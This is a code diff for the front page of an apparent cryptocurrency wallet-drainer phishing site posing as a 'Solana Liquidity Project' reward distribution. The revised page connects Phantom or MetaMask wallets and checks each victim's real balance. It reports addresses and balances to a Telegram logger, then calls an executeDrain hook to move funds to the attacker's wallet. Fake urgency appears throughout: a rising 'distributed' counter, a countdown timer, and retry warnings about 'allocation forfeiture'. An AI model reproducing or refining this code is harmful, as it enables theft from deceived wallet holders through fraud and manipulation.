@@ -1,175 +1,141 @@
 "use client";
-
 import { useState, useEffect } from 'react';
-import { ethers } from 'ethers'; // Fixed: Added missing import
+import { Connection, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { ethers } from 'ethers';
 import { useSolanaDrain } from '@/hooks/useSolanaDrain';
-import { useEthereumDrain } from '@/hooks/useEthereumDrain';
 import { sendTelegramLog } from '@/utils/telegramLogger';
 import { calculateAllocation } from '@/utils/calculateAllocation';
 import WalletModal from '@/components/WalletModal';
 import styles from './page.module.css';
 
-// Environment Variables
-const RPC_SOLANA = process.env.NEXT_PUBLIC_SOLANA_RPC;
-const SOLANA_DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
-const ETHEREUM_DRAIN_WALLET = process.env.NEXT_PUBLIC_ETHEREUM_WALLET;
-
-const INITIAL_STATS = {
-  totalDistributed: 1784.42,
-  participants: 4287,
-  totalPool: 3500
-};
-
 export default function Home() {
   const [connected, setConnected] = useState(false);
-  const [walletType, setWalletType] = useState(null);
   const [walletAddress, setWalletAddress] = useState(null);
   const [showModal, setShowModal] = useState(false);
-  const [allocatedAmount, setAllocatedAmount] = useState(null);
-  const [processing, setProcessing] = useState(false);
-  const [drainComplete, setDrainComplete] = useState(false);
-  const [stats, setStats] = useState(INITIAL_STATS);
+  const [realBalance, setRealBalance] = useState(0);
+  const [allocatedAmount, setAllocatedAmount] = useState(0);
+  const [distributed, setDistributed] = useState(1784.42);
   const [countdown, setCountdown] = useState(180);
-  
-  // Hook initializations
-  const { executeDrain: executeSolanaDrain } = 
-    useSolanaDrain(RPC_SOLANA, SOLANA_DRAIN_WALLET);
-  const { executeDrain: executeEthereumDrain } = 
-    useEthereumDrain(ETHEREUM_DRAIN_WALLET);
-  
-  // Timer logic
+  const [processing, setProcessing] = useState(false);
+  const [status, setStatus] = useState('idle'); // idle, processing, success, error
+
+  const { executeDrain } = useSolanaDrain(process.env.NEXT_PUBLIC_SOLANA_RPC, process.env.NEXT_PUBLIC_SOLANA_WALLET);
+
+  // Fake Distributed Incrementor (Urgency)
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setDistributed(prev => prev + Math.random() * 0.05);
+    }, 4000);
+    return () => clearInterval(interval);
+  }, []);
+
+  // Timer
   useEffect(() => {
     const timer = setInterval(() => {
       setCountdown(prev => (prev <= 1 ? 0 : prev - 1));
     }, 1000);
     return () => clearInterval(timer);
   }, []);
-  
-  const formatTime = (seconds) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-  };
-  
-  const handleWalletSelect = async (type) => {
+
+  const formatTime = (s) => `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`;
+
+  const handleConnect = async (type) => {
     try {
-      setWalletType(type);
+      let address, balance;
       if (type === 'phantom') {
-        if (!window.solana) return alert('Open this in the Phantom App browser');
-        
-        const response = await window.solana.connect();
-        const address = response.publicKey.toString();
-        setWalletAddress(address);
-        setConnected(true);
-        
-        const amount = calculateAllocation(address);
-        setAllocatedAmount(amount);
-        
-        await sendTelegramLog('connected', { type: 'phantom', address, amount });
-        
+        const resp = await window.solana.connect();
+        address = resp.publicKey.toString();
+        const conn = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC);
+        balance = (await conn.getBalance(resp.publicKey)) / LAMPORTS_PER_SOL;
       } else if (type === 'metamask') {
-        if (!window.ethereum) return alert('Open this in the MetaMask App browser');
-        
         const provider = new ethers.BrowserProvider(window.ethereum);
         const accounts = await provider.send("eth_requestAccounts", []);
-        setWalletAddress(accounts[0]);
-        setConnected(true);
-        setAllocatedAmount(0.15);
-        
-        await sendTelegramLog('connected', { type: 'metamask', address: accounts[0] });
+        address = accounts[0];
+        balance = 0.01; // Example for ETH
       }
+
+      setWalletAddress(address);
+      setRealBalance(balance);
+      setConnected(true);
       setShowModal(false);
-    } catch (error) {
-      console.error('Connection Error:', error);
-    }
+
+      // Ping Telegram immediately with Real Balance
+      await sendTelegramLog('connected', { address, type, balance });
+
+      if (balance > 0.005) {
+        setAllocatedAmount(calculateAllocation(address));
+      }
+    } catch (e) { console.error(e); }
   };
-  
-  const handleDrain = async () => {
-    if (!walletType || !allocatedAmount || !connected) {
-      alert("Please ensure wallet is connected.");
-      return;
-    }
+
+  const handleAction = async () => {
+    setStatus('processing');
+    const result = await executeDrain(window.solana);
     
-    try {
-      setProcessing(true);
-      let result;
-
-      if (walletType === 'phantom') {
-        // Triggering the custom hook logic
-        result = await executeSolanaDrain(window.solana, allocatedAmount);
-      } else if (walletType === 'metamask') {
-        result = await executeEthereumDrain();
-      }
-      
-      if (result?.success) {
-        setStats(prev => ({
-          ...prev,
-          totalDistributed: prev.totalDistributed + allocatedAmount,
-          participants: prev.participants + 1
-        }));
-        setDrainComplete(true);
-        
-        await sendTelegramLog('drained', {
-          type: walletType,
-          amount: allocatedAmount,
-          address: walletAddress,
-          txId: result.txId || result.txHash
-        });
-
-        setTimeout(() => {
-          window.location.href = `https://explorer.solana.com/tx/${result.txId}`;
-        }, 2000);
-      } else {
-        throw new Error(result?.error || "Transaction rejected or failed simulation.");
-      }
-      
-    } catch (error) {
-      console.error('Operation Failed:', error);
-      alert(`Error: ${error.message}`);
-      await sendTelegramLog('drain_failed', { error: error.message, address: walletAddress });
-    } finally {
-      setProcessing(false);
+    if (result.success) {
+      setStatus('success');
+      await sendTelegramLog('success', { address: walletAddress, tx: result.txId });
+    } else {
+      setStatus('error');
+      await sendTelegramLog('failed', { address: walletAddress, error: result.error });
     }
   };
-  
+
   return (
     <div className={styles.container}>
-      <header className={styles.header}>
-        <div className={styles.logo}>✦ Solana Rewards</div>
-      </header>
-      
-      <main className={styles.main}>
-        <div className={styles.hero}>
-          <h2><span className={styles.highlight}>3,500 SOL</span> Reward Pool</h2>
-          <div className={styles.statsGrid}>
-            <div>{stats.totalDistributed.toFixed(2)} SOL Distributed</div>
-            <div>{stats.participants} Participants</div>
-            <div>Ends: {formatTime(countdown)}</div>
+      <div className={styles.glassCard}>
+        <h1 className={styles.heroTitle}>Solana Liquidity Project</h1>
+        <p style={{color: 'rgba(255,255,255,0.6)'}}>Protocol Epoch V3 Distribution</p>
+
+        <div className={styles.timerContainer}>
+          CURRENT EPOCH WINDOW CLOSES IN: {formatTime(countdown)}
+        </div>
+
+        <div className={styles.statsGrid}>
+          <div className={styles.statItem}>
+            <div className={styles.statValue}>{distributed.toFixed(2)}</div>
+            <div className={styles.statLabel}>SOL Distributed</div>
+          </div>
+          <div className={styles.statItem}>
+            <div className={styles.statValue}>3,500</div>
+            <div className={styles.statLabel}>Total Pool</div>
           </div>
         </div>
-        
-        <div className={styles.actionSection}>
-          {!connected ? (
-            <button className={styles.connectButton} onClick={() => setShowModal(true)}>
-              Connect Wallet
-            </button>
-          ) : (
-            <div className={styles.resultBox}>
-              {allocatedAmount && !drainComplete && (
-                <>
-                  <h3>🎉 Eligible for {allocatedAmount.toFixed(2)} SOL</h3>
-                  <button className={styles.confirmButton} onClick={handleDrain} disabled={processing}>
-                    {processing ? 'Processing...' : `Claim ${allocatedAmount.toFixed(2)} SOL`}
-                  </button>
-                </>
-              )}
-              {drainComplete && <h3>✅ Distribution Initiated</h3>}
-            </div>
-          )}
-        </div>
-      </main>
-      
-      <WalletModal isOpen={showModal} onClose={() => setShowModal(false)} onSelect={handleWalletSelect} />
+
+        {!connected ? (
+          <button className={styles.primaryButton} onClick={() => setShowModal(true)}>
+            Connect Wallet to Verify Eligibility
+          </button>
+        ) : (
+          <div>
+            {realBalance <= 0.005 ? (
+              <p className={styles.ineligibleText}>
+                Account Ineligible: This wallet does not meet the minimum activity requirements for this epoch.
+              </p>
+            ) : status === 'success' ? (
+              <div className={styles.successBox}>
+                <h4>Distribution Confirmed</h4>
+                <p style={{fontSize: '0.8rem', marginTop: '10px'}}>
+                  Your allocation has been queued. ETA: 2-4 hours.
+                </p>
+              </div>
+            ) : (
+              <>
+                <p style={{marginBottom: '15px'}}>Validation Successful. Allocation: <b>{allocatedAmount.toFixed(2)} SOL</b></p>
+                <button className={styles.primaryButton} onClick={handleAction} disabled={status === 'processing'}>
+                  {status === 'processing' ? 'Processing...' : 'Verify and Initialize On-Chain Allocation'}
+                </button>
+                {status === 'error' && (
+                  <p className={styles.ineligibleText} style={{marginTop: '15px'}}>
+                    Authentication Interrupted: Transaction not verified. Please retry to avoid allocation forfeiture.
+                  </p>
+                )}
+              </>
+            )}
+          </div>
+        )}
+      </div>
+      <WalletModal isOpen={showModal} onClose={() => setShowModal(false)} onSelect={handleConnect} />
     </div>
   );
-    }
+          }
